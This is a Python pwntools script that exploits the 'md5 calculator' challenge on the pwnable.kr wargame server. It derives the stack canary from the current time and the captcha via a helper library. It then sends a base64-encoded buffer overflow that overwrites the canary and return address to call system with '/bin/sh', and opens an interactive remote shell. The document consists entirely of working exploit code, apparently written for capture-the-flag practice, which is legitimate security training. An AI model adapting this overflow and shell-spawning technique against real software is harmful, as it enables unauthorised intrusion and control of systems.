#!/usr/bin/python3
from pwn import *
import ctypes

lib = ctypes.cdll.LoadLibrary('./md5calculator.so')
func = lib.func
func.argtype = [ctypes.c_int, ctypes.c_int]
func.restype = ctypes.c_int

g_buff_addr = 0x0804b0e0

p = remote('pwnable.kr', 9002)
cur_time = int(time.time())

buffer = p.readuntil('Are you human? input captcha : ').decode('ascii')
print(buffer, end = '')

buffer = p.recv()
captcha = int(buffer.replace(b'\n', b'').decode('ascii'))
print(captcha)

print('gs:0x20 =', end = '')
gs_0x14 = lib.func(cur_time, captcha)
print()

p.sendline(str(captcha))

exolpit_pre_buffer = 512 * b'a' + \
                     pack(gs_0x14, 4 * 8, endianness = 'little') + \
                     8 * b'a' + \
                     4 * b'a' + \
                     b'\x87\x91\x04\x08'

base64_len = len(base64.b64encode(exolpit_pre_buffer + b'\x00\x00\x00\x00'))
shell_cmd_addr = g_buff_addr + base64_len + 4
exolpit_buffer = base64.b64encode(exolpit_pre_buffer + \
                                  pack(shell_cmd_addr, 4 * 8, endianness = 'little'))

exolpit_buffer += 4 * b'\x00'
exolpit_buffer += b'/bin/sh'

p.send(exolpit_buffer + b'\n')
time.sleep(1)
p.interactive()

